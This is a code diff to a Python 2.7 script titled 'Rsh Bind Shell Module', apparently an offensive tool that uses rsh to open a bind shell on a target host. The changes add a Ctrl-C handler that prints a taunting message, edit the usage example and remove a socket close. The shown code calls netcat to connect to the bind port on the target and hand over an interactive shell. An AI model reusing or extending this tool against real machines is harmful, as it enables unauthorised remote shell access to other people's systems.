@@ -1,14 +1,21 @@
 #!/usr/bin/python2.7
 #Rsh Bind Shell Module
+
 import sys
 import socket
 import random
 import time
 import subprocess
+import signal
+def handler(signum, frame):
+    print '======================YOU SHOULDNT OF USED CTRL C!!!!!!!!!!======================'
+signal.signal(signal.SIGINT, handler)
+
+
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 if len(sys.argv) < 4:
     print "exiting"
-    print "Example ./rsh.py 10.129.121.16 foobar foobar id"
+    print "Example ./rsh.py 10.129.121.16 foobar foobar"
     sys.exit()
 else:
     host = sys.argv[1]
@@ -47,7 +54,6 @@ if user.lower() =="y":
     print 'Using Netcat To Connect To %s On Port %s'% (host, str(bindport))
     print 'Type Exit Into The Shell To Shut Down The Bind Port'
     subprocess.call(['nc' , str(host), str(bindport)])
-    s.close()
 else:
     s.close()
     sys.exit()
